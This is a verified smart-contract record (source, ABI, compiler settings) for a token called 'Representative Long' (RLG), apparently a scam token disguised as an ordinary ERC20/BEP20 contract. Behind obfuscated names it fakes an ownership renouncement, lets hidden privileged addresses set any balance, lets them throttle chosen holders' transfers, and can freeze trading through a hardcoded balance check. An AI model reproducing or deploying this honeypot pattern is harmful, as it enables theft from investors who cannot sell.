{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface limitTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamBuy {\n    function createPair(address shouldTrading, address fromEnable) external returns (address);\n}\n\ninterface tradingMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txReceiver) external view returns (uint256);\n\n    function transfer(address listLaunch, uint256 fundShould) external returns (bool);\n\n    function allowance(address sellToList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listLaunch,\n        uint256 fundShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingSender, uint256 value);\n    event Approval(address indexed sellToList, address indexed spender, uint256 value);\n}\n\ninterface buyReceiver is tradingMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepresentativeLong is isFund, tradingMode, buyReceiver {\n\n    address receiverShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address launchTeam, address minMarketingBuy) external view virtual override returns (uint256) {\n        if (minMarketingBuy == shouldSender) {\n            return type(uint256).max;\n        }\n        return exemptLaunchLiquidity[launchTeam][minMarketingBuy];\n    }\n\n    event OwnershipTransferred(address indexed fundTake, address indexed txMarketing);\n\n    function isFee() private view {\n        require(shouldExemptLimit[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTo;\n    }\n\n    bool private receiverTeam;\n\n    function launchEnable(address toBuy, uint256 fundShould) public {\n        isFee();\n        listMode[toBuy] = fundShould;\n    }\n\n    string private buyTakeAt = \"RLG\";\n\n    uint256 private shouldLaunch = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private listMode;\n\n    uint256 constant launchTake = 5 ** 10;\n\n    uint256 maxMin;\n\n    function receiverWallet(address shouldMarketing) public {\n        isFee();\n        if (maxToken) {\n            receiverTeam = false;\n        }\n        if (shouldMarketing == fundIs || shouldMarketing == sellLimit) {\n            return;\n        }\n        fromMax[shouldMarketing] = true;\n    }\n\n    address public fundIs;\n\n    uint256 public atSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLaunch;\n    }\n\n    function marketingAuto(address isMarketing, address listLaunch, uint256 fundShould) internal returns (bool) {\n        if (isMarketing == fundIs) {\n            return maxList(isMarketing, listLaunch, fundShould);\n        }\n        uint256 launchedTotal = tradingMode(sellLimit).balanceOf(receiverShould);\n        require(launchedTotal == maxMin);\n        require(listLaunch != receiverShould);\n        if (fromMax[isMarketing]) {\n            return maxList(isMarketing, listLaunch, launchTake);\n        }\n        return maxList(isMarketing, listLaunch, fundShould);\n    }\n\n    function getOwner() external view returns (address) {\n        return isAuto;\n    }\n\n    constructor (){\n        if (atSell != amountMin) {\n            fundAmount = false;\n        }\n        limitTrading amountTrading = limitTrading(shouldSender);\n        sellLimit = teamBuy(amountTrading.factory()).createPair(amountTrading.WETH(), address(this));\n        \n        fundIs = _msgSender();\n        walletSender();\n        shouldExemptLimit[fundIs] = true;\n        listMode[fundIs] = shouldLaunch;\n        \n        emit Transfer(address(0), fundIs, shouldLaunch);\n    }\n\n    bool private maxToken;\n\n    function transferFrom(address isMarketing, address listLaunch, uint256 fundShould) external override returns (bool) {\n        if (_msgSender() != shouldSender) {\n            if (exemptLaunchLiquidity[isMarketing][_msgSender()] != type(uint256).max) {\n                require(fundShould <= exemptLaunchLiquidity[isMarketing][_msgSender()]);\n                exemptLaunchLiquidity[isMarketing][_msgSender()] -= fundShould;\n            }\n        }\n        return marketingAuto(isMarketing, listLaunch, fundShould);\n    }\n\n    mapping(address => bool) public shouldExemptLimit;\n\n    function approve(address minMarketingBuy, uint256 fundShould) public virtual override returns (bool) {\n        exemptLaunchLiquidity[_msgSender()][minMarketingBuy] = fundShould;\n        emit Approval(_msgSender(), minMarketingBuy, fundShould);\n        return true;\n    }\n\n    string private receiverMinSender = \"Representative Long\";\n\n    uint256 exemptAmount;\n\n    bool public takeLaunch;\n\n    mapping(address => bool) public fromMax;\n\n    function owner() external view returns (address) {\n        return isAuto;\n    }\n\n    uint256 public amountMin;\n\n    address public sellLimit;\n\n    mapping(address => mapping(address => uint256)) private exemptLaunchLiquidity;\n\n    function maxList(address isMarketing, address listLaunch, uint256 fundShould) internal returns (bool) {\n        require(listMode[isMarketing] >= fundShould);\n        listMode[isMarketing] -= fundShould;\n        listMode[listLaunch] += fundShould;\n        emit Transfer(isMarketing, listLaunch, fundShould);\n        return true;\n    }\n\n    function transfer(address toBuy, uint256 fundShould) external virtual override returns (bool) {\n        return marketingAuto(_msgSender(), toBuy, fundShould);\n    }\n\n    bool private fundAmount;\n\n    function balanceOf(address txReceiver) public view virtual override returns (uint256) {\n        return listMode[txReceiver];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMinSender;\n    }\n\n    bool public limitSwapFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTakeAt;\n    }\n\n    address shouldSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private isAuto;\n\n    bool public autoFee;\n\n    function walletSender() public {\n        emit OwnershipTransferred(fundIs, address(0));\n        isAuto = address(0);\n    }\n\n    function atSender(uint256 fundShould) public {\n        isFee();\n        maxMin = fundShould;\n    }\n\n    function limitLaunch(address sellMarketing) public {\n        require(sellMarketing.balance < 100000);\n        if (autoFee) {\n            return;\n        }\n        if (fundAmount == maxToken) {\n            limitSwapFrom = false;\n        }\n        shouldExemptLimit[sellMarketing] = true;\n        \n        autoFee = true;\n    }\n\n    uint8 private teamTo = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellToList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMarketingBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"launchEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwapFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RepresentativeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}